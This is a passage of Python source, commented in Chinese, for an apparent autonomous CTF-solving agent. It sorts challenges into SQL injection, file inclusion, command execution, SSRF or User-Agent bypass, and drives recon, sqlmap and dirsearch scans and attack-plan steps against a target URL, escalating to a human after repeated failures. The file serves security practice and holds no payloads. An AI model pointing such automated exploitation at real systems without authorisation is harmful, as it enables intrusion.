        self.last_help_reason = None
        self.help_cooldown_remaining = 0
        self.step_budget_limit = self.max_steps
        self.graph_manager.reset()

    def _classify_problem(self, hint: str):
        """自动分类题目类型"""
        hint_lower = hint.lower()

        # UA相关
        if any(k in hint_lower for k in ["手机", "mobile", "ua", "user-agent", "安卓", "android", "iphone"]):
            self.target_type = "ua_bypass"
            self.problem_classified = True
            self.log("题目类型识别: User-Agent绕过", "ANALYSIS")

        # SQL注入
        elif any(k in hint_lower for k in ["sql", "注入", "database", "database", "mysql"]):
            self.target_type = "sqli"
            self.log("题目类型识别: SQL注入", "ANALYSIS")

        # 文件包含
        elif any(k in hint_lower for k in ["file", "文件", "包含", "include", "lfi", "path"]):
            self.target_type = "lfi"
            self.log("题目类型识别: 文件包含", "ANALYSIS")

        # 命令执行
        elif any(k in hint_lower for k in ["rce", "命令", "执行", "exec", "shell", "system"]):
            self.target_type = "rce"
            self.log("题目类型识别: 命令执行", "ANALYSIS")

        # SSRF
        elif any(k in hint_lower for k in ["ssrf", "内网", "gopher", "file://", "curl"]):
            self.target_type = "ssrf"
            self.log("题目类型识别: SSRF", "ANALYSIS")

    def _analyze_source_code(self, code: str) -> str:
        """
        分析PHP源码，识别漏洞和攻击链

        Args:
            code: PHP源代码

        Returns:
            分析结果文本
        """
        if not SOURCE_ANALYSIS_AVAILABLE:
            return "[Warning] Source analyzer not available"

        self.log("[Analysis] 分析PHP源码中...", "ANALYSIS")

        result = analyze_php(code)
        self.source_analysis_result = result

        # 格式化输出
        output = []
        output.append(f"\n{'='*60}")
        output.append(f"[Source Analysis] Vulnerability Type: {result.vuln_type}")
        output.append(f"{'='*60}")

        # 发现的模式
        output.append(f"\n[Detected Patterns] {len(result.patterns)} found:")
        for p in result.patterns:
            output.append(f"  • {p.name}: {p.description}")
            output.append(f"    Severity: {p.severity}, Confidence: {p.confidence}")

        # 类信息
        for cls in result.class_info:
            output.append(f"\n[Class] {cls.name}")
            output.append(f"  Magic methods: {', '.join(cls.magic_methods)}")
            output.append(f"  Dangerous calls: {[c['function'] for c in cls.dangerous_calls]}")
            output.append(f"  Controllable properties: {cls.controlled_properties}")

        # 攻击链
        if result.attack_chain:
            self.target_type = "deserialization"  # 根据分析结果更新类型
            output.append(f"\n[Attack Chain Detected!]")
            for step in result.attack_chain:
                output.append(f"  → {step}")
            self.log("[SUCCESS] Attack chain identified!")

        # POC建议
        if result.suggested_poc:
            output.append(f"\n[Suggested POC Generated]")
            output.append(result.suggested_poc[:500] + "...")

        output.append(f"{'='*60}\n")

        analysis_text = '\n'.join(output)
        self.log(analysis_text)
        return analysis_text

    def _target_with_endpoint(self, endpoint: str) -> str:
        endpoint_text = str(endpoint or "").strip()
        if not endpoint_text:
            return self.target_url
        if endpoint_text.startswith(("http://", "https://")):
            return endpoint_text
        base = self.target_url or getattr(self.agent_context, "url", "") or ""
        if not base:
            return endpoint_text
        return urljoin(base.rstrip("/") + "/", endpoint_text.lstrip("/"))

    def _build_graph_informed_action(self) -> Optional[Dict[str, Any]]:
        self._refresh_graph_state()
        steps = self.memory.steps
        target = self.target_url
        signals = self.graph_manager.planner_signals()
        recent_failure_stats = self._recent_action_failure_counts(window=5)
        latest_guidance = str(signals.get("latest_guidance") or "").strip()
        known_endpoints = list(signals.get("known_endpoints") or [])
        known_parameters = list(signals.get("known_parameters") or [])
        failed_tools = set(signals.get("failed_tools") or [])
        failed_tools.update(
            tool
            for tool, count in recent_failure_stats.get("canonical_tool_counts", {}).items()
            if count > 0
        )
        failed_action_counts = dict(signals.get("failed_action_counts") or {})
        for action_id, count in recent_failure_stats.get("action_id_counts", {}).items():
            failed_action_counts[action_id] = max(failed_action_counts.get(action_id, 0), count)

        if latest_guidance:
            guidance_lower = latest_guidance.lower()
            if "cookie" in guidance_lower and self.target_type != "ua_bypass":
                return self._build_action(
                    "recon",
                    target=target,
                    description="根据人工提示重新侦察",
                    intent="围绕 cookies/session 线索重新采样响应",
                    expected_tool="recon",
                    params={"focus": "cookies"},
                    metadata={"guided_by": "graph_guidance", "guidance": latest_guidance},
                )
            if ("ua" in guidance_lower or "user-agent" in guidance_lower or "mobile" in guidance_lower) and self.target_type != "ua_bypass":
                return self._build_action(
                    "ua_test",
                    target=target,
                    description="根据提示测试 UA 分支",
                    intent="优先验证人工提示中的 User-Agent 线索",
                    expected_tool="ua_test",
                    params={"ua": "Mobile"},
                    metadata={"ua": "Mobile", "guided_by": "graph_guidance", "guidance": latest_guidance},
                )

        if known_endpoints and "dirsearch" not in failed_tools:
            latest_endpoint = str(signals.get("latest_endpoint") or known_endpoints[-1])
            endpoint_target = self._target_with_endpoint(latest_endpoint)
            current_target = self.target_url or getattr(self.agent_context, "url", "") or ""
            if endpoint_target and endpoint_target != current_target and not any(step.target == endpoint_target for step in steps):
                return self._build_action(
                    "recon",
                    target=endpoint_target,
                    description="基于已发现端点继续侦察",
                    intent="沿最新发现的端点继续收集可利用线索",
                    expected_tool="recon",
                    metadata={"graph_driven": True, "endpoint": latest_endpoint},
                )

        if known_parameters and self.target_type == "unknown" and "sqlmap" not in failed_tools:
            latest_parameter = str(signals.get("latest_parameter") or known_parameters[-1])
            param_target = target
            if latest_parameter and "?" not in param_target and "=" not in param_target:
                separator = "&" if "?" in param_target else "?"
                param_target = f"{param_target}{separator}{latest_parameter}=1"
            sqlmap_probe = self._build_action(
                "sqlmap_scan",
                target=param_target,
                description="基于参数线索检测注入",
                intent="优先验证图中已发现参数是否存在 SQL 注入",
                expected_tool="sqlmap",
                params={"batch": True},
                metadata={"graph_driven": True, "parameter": latest_parameter},
            )
            if not self.memory.should_skip_action(sqlmap_probe["id"], max_failures=self.max_failures):
                return sqlmap_probe

        for action_id, count in failed_action_counts.items():
            if count >= self.max_failures:
                latest_step = self.memory.latest_step_for_action(action_id)
                if latest_step and latest_step.target == target and latest_step.action_type in {"recon", "sqlmap_scan"}:
                    return self._build_action(
                        "dir_scan",
                        target=target,
                        description="图中动作已多次失败，切换目录探索",
                        intent="避免重复失败动作，改用目录扫描寻找新入口",
                        expected_tool="dirsearch",
                        params={"extensions": ["php", "html", "txt"]},
                        metadata={"alternative": True, "graph_driven": True, "avoids_action_id": action_id},
                    )

        return None

    def _decide_next_action(self) -> Dict[str, Any]:
        """
        决策下一步行动

        核心：优先执行攻击计划（如果有），否则基于启发式决策
        """
        steps = self.memory.steps
        target = self.target_url

        if self.attack_plan:
            next_step = self.attack_plan.get_next_step()
            if next_step:
                self.log(f"[AttackPlan] Executing: {next_step.name}", "PLAN")
                return self._build_action(
                    "attack_step",
                    target=target,
                    description=next_step.description,
                    intent=f"执行攻击计划步骤 {next_step.name}",
                    expected_tool="attack_step",
                    params={"code": next_step.code},
                    metadata={
                        "step_name": next_step.name,
                        "code": next_step.code,
                    },
                )
            self.log("[AttackPlan] All steps completed")

        if self.source_analysis_result and not any(s.tool == "source_analysis" for s in steps):
            return self._build_action(
                "source_analysis",
                target="PHP code",
                description="分析已提供源码",
                intent="基于源码提取漏洞线索",
                expected_tool="source_analysis",
                params={"code": self.source_code},
                metadata={"code": self.source_code},
            )

        if not steps:
            return self._build_action(
                "recon",
                target=target,
                description="初始信息收集",
                intent="收集首页响应、头和可能的跳转信息",
                expected_tool="recon",
            )

        graph_action = self._build_graph_informed_action()
        if graph_action is not None:
            return graph_action

        if self.target_type == "ua_bypass":
            if not any(s.tool in {"ua_test", "python_poc"} and "Mobile" in str(s.result) for s in steps):
                return self._build_action(
                    "ua_test",
                    target=target,
                    description="测试Mobile UA",
                    intent="验证目标是否依赖 User-Agent 分支",
                    expected_tool="ua_test",
                    params={"ua": "Mobile"},
                    metadata={"ua": "Mobile"},
                )
            last_step = steps[-1]
            if "301" in str(last_step.result) or "302" in str(last_step.result):
                redirect_url = self._extract_redirect(last_step.result)
                if redirect_url:
                    redirect_target = f"{target.rstrip('/')}/{redirect_url.lstrip('/')}"
                    return self._build_action(
                        "follow_redirect",
                        target=redirect_target,
                        description="跟随重定向",
                        intent="访问重定向位置继续验证 UA 绕过",
                        expected_tool="follow_redirect",
                        params={"ua": "Mobile"},
                        metadata={"ua": "Mobile"},
                    )

        if self.target_type == "sqli":
            if not any(s.tool == "sqlmap" for s in steps):
                return self._build_action(
                    "sqlmap_scan",
                    target=target,
                    description="检测SQL注入点",
                    intent="先用 sqlmap 做基础注入检测",
                    expected_tool="sqlmap",
                    params={"batch": True},
                )
            if any(s.tool == "sqlmap" and not s.success for s in steps[-2:]):
                return self._build_action(
                    "dir_scan",
                    target=target,
                    description="补充目录扫描",
                    intent="收集更多端点后再决定注入路径",
                    expected_tool="dirsearch",
                    params={"extensions": ["php", "txt", "bak"]},
                )

        if steps and not steps[-1].success:
            fail_count = self.memory.fail_count_for_step(steps[-1])
            if fail_count >= 2:
                return self._build_action(
                    "dir_scan",
                    target=target,
                    description="当前方法多次失败，改做目录探索",
                    intent="切换到不同工具获取新线索",
                    expected_tool="dirsearch",
                    params={"extensions": ["php", "html", "txt"]},
                    metadata={"alternative": True},
                )

        return self._build_action(
            "recon",
            target=target,
            description="继续信息收集",
            intent="重新采样响应并寻找新的利用线索",
            expected_tool="recon",
        )

    def _execute_action(self, action: Dict[str, Any]) -> str:
        """执行标准化动作。"""
        action_type = action.get("type", "unknown")
        handler = self.action_handlers.get(action_type)
        if not handler:
            return self._build_executor_error(action, f"unknown action type: {action_type}")

        result = handler(action)
        if action_type == "attack_step" and not result.startswith("[attack_step]"):
            self._mark_action_completed(action, result)
        return result

    def _try_common_bypasses(self, target: str) -> str:
        """尝试常见的绕过方法"""
        return "尝试其他方法..."

    def _analyze_output(self, output: str) -> List[str]:
        """分析输出发现线索"""
        clues = []

        if "301" in output or "302" in output:
            clues.append("redirect")

        if "User-Agent" in output and "Mobile" in output:
            clues.append("ua_sensitive")

        urls = re.findall(r'/(\w+\.html?|\w+\.php)', output)
        if urls:
            clues.append(f"new_endpoint: {urls}")

        return clues

    def _extract_redirect(self, result: str) -> Optional[str]:
        """从重定向响应中提取目标URL"""
        match = re.search(r'Redirect to?:?\s*(.+)', result)
        if match:
            return match.group(1).strip().replace('/', '')
        return None

    def _analyze_failures(self) -> Dict[str, int]:
        """分析最近失败的模式"""
        fail_types = {
            "payload_error": 0,
            "execution_error": 0,
            "same_error": 0,
            "timeout": 0,
        }

        failed_steps = [s for s in self.memory.steps if not s.success][-5:]
        error_signatures: List[str] = []

        for step in failed_steps:
            result_text = str(step.result or "")
            lower_result = result_text.lower()

            if any(keyword in lower_result for keyword in ["syntax", "parse", "invalid", "unexpected"]):
                fail_types["payload_error"] += 1

            if any(keyword in lower_result for keyword in ["timeout", "time out", "connection", "network", "reset", "refused"]):
                fail_types["execution_error"] += 1
                fail_types["timeout"] += 1
            elif any(keyword in lower_result for keyword in ["error", "exception", "failed", "denied"]):
                fail_types["execution_error"] += 1

            error_signatures.append(lower_result[:120])

        if error_signatures:
            unique_ratio = len(set(error_signatures)) / len(error_signatures)
            if unique_ratio <= 0.5:
                fail_types["same_error"] = len(error_signatures)

        return fail_types

    def _auto_adjust_strategy(self, failure_analysis: Dict[str, int]):
        """根据失败分析自动微调策略"""
        if failure_analysis.get("payload_error", 0) >= 2:
            self.log("[STRATEGY] Payload syntax issues detected, switching payload template", "INFO")

        if failure_analysis.get("timeout", 0) >= 2:
            self.log("[STRATEGY] Multiple timeouts detected, increasing timeout budget", "INFO")

        if failure_analysis.get("same_error", 0) >= 2:
            self.log("[STRATEGY] Repeated identical error, forcing action diversification", "INFO")

    def _recent_action_failure_counts(self, window: int = 5) -> Dict[str, Any]:
        recent_steps = self.memory.steps[-window:] if window > 0 else self.memory.steps
        action_ids = {
            step.action_id
            for step in recent_steps
            if not step.success and step.action_id
        }
        action_types = {
            step.action_type or step.expected_tool or step.tool
            for step in recent_steps
            if not step.success and (step.action_type or step.expected_tool or step.tool)
        }
        canonical_tools = {
            step.canonical_tool or step.tool
            for step in recent_steps
            if not step.success and (step.canonical_tool or step.tool)
        }
        return {
            "recent_steps": recent_steps,
            "distinct_actions": len(action_ids),
            "distinct_action_types": len(action_types),
            "action_id_counts": {
                action_id: self.memory.action_fail_count(action_id)
                for action_id in action_ids
            },
            "action_type_counts": {
                action_type: sum(
                    1
                    for step in self.memory.steps
                    if not step.success and (step.action_type or step.expected_tool or step.tool) == action_type
                )
                for action_type in action_types
            },
            "canonical_tool_counts": {
                tool: self._count_recent_failures_by_tool(tool, window=window)
                for tool in canonical_tools
            },
        }

    def _should_ask_for_help(self) -> bool:
        if self.help_cooldown_remaining > 0:
            self.help_cooldown_remaining -= 1
            self.log("[FAIL_ANALYSIS] Resume cooldown active, delaying help escalation", "INFO")
            return False

        steps = self.memory.steps
        if not steps:
            return False

        total_steps = len(steps)
        consecutive_failures = 0
        for step in reversed(steps):
            if step.success:
                break
            consecutive_failures += 1

        recent_failure_stats = self._recent_action_failure_counts(window=5)
        if total_steps >= 5 and recent_failure_stats["distinct_actions"] <= 2 and recent_failure_stats["distinct_action_types"] <= 2:
            self.log("[FAIL_ANALYSIS] Limited action diversity, forcing replanning", "FAIL")
            self.last_help_reason = "limited_diversity"
            return True

        fail_types = self._analyze_failures()
        self._auto_adjust_strategy(fail_types)

        payload_errors = fail_types.get("payload_error", 0)
        execution_errors = fail_types.get("execution_error", 0)
        same_error = fail_types.get("same_error", 0)
        timeouts = fail_types.get("timeout", 0)

        if payload_errors >= 2 and consecutive_failures < self.max_failures:
            self.log("[FAIL_ANALYSIS] Payload errors detected, retrying with adjustments...", "FAIL")
            return False

        if execution_errors >= 2 and consecutive_failures < self.max_failures:
            self.log("[FAIL_ANALYSIS] Execution errors detected, adjusting parameters...", "FAIL")
            return False

        if same_error >= 3:
            self.log("[FAIL_ANALYSIS] Repeated same error, escalate to human", "FAIL")
            self.last_help_reason = "same_error"
            return True

        if timeouts >= 3:
            self.log("[FAIL_ANALYSIS] Multiple timeouts encountered", "FAIL")
            self.last_help_reason = "timeouts"
            return True

        if total_steps < self.min_steps_before_help and consecutive_failures < self.max_failures:
            return False

        if consecutive_failures >= self.max_failures:
            self.log(f"[FAIL_ANALYSIS] Consecutive failures reached {consecutive_failures}", "FAIL")
            self.last_help_reason = "consecutive_failures"
            return True

        for action_id, count in recent_failure_stats["action_id_counts"].items():
            if count >= self.max_failures:
                self.log(f"[FAIL_ANALYSIS] Action {action_id} failed {count} times", "FAIL")
                self.last_help_reason = f"action_failures:{action_id}"
                return True

        for action_type, count in recent_failure_stats["action_type_counts"].items():
            if count >= self.max_failures:
                self.log(f"[FAIL_ANALYSIS] Action type {action_type} failed {count} times", "FAIL")
                self.last_help_reason = f"action_type_failures:{action_type}"
                return True

        critical_tools = {"python_poc", "sqlmap", "dirsearch", "source_analysis"}
        for tool, count in recent_failure_stats["canonical_tool_counts"].items():
            if tool in critical_tools and count >= self.max_failures:
                self.log(f"[FAIL_ANALYSIS] Tool {tool} failed {count} times recently", "FAIL")
                self.last_help_reason = f"tool_failures:{tool}"
                return True

        if total_steps >= self.max_steps:
            self.log(f"[FAIL_ANALYSIS] Max steps ({self.max_steps}) reached", "FAIL")
            self.consecutive_help_triggers += 1
            self.last_help_reason = "max_steps"
            return True

        if self.consecutive_help_triggers >= 1 and self.last_help_reason == "max_steps":
            if total_steps < self.max_steps + 2:
                self.log("[FAIL_ANALYSIS] Recently hit max_steps, retrying before escalating", "INFO")
                return False

        self.last_help_reason = None
        return False

    def _auto_save_experience(self, flag: str):
        """自动保存解题经验（无需确认）"""
        try:
            steps = [
                {
                    "tool": step.tool,
                    "target": step.target,
                    "result": step.result,
                    "success": step.success,
                }
                for step in self.memory.steps
            ]

            techniques = list({
                step.tool for step in self.memory.steps if step.success
            })

            exp_file = auto_save_experience(
                problem_type=self.target_type,
                target=self.target_url,
                steps=steps,
                flag=flag,
                key_techniques=techniques,
            )

            self.log(f"解题经验已自动保存: {exp_file}", "MEMORY")

        except Exception as e:
            self.log(f"保存经验失败: {e}", "ERROR")


def auto_solve(
    url: str = "",
    hint: str = "",
    description: str = "",
    source_code: str = ""
) -> Dict[str, Any]:
    """
    一键自动解题。

    默认转发到项目级 orchestrator 统一主链入口，避免绕过初始化与状态编排。
    """
    from orchestrator import orchestrate_challenge

    return orchestrate_challenge(
        url=url,
        hint=hint,
        description=description,
        source_code=source_code,
    )


# 测试
if __name__ == "__main__":
    # 使用说明
    print("""
CTF Agent v2.1 - 自动化解题模块
==============================

使用方式:
    from orchestrator import orchestrate_challenge

    result = orchestrate_challenge(
        url="https://target.com",
        hint="有手机就行",
        description="题目描述"
    )

    print(result.get("flag", ""))

或者:
    python main.py --url "https://target.com" --hint "有手机就行" --description "题目描述"
    """)
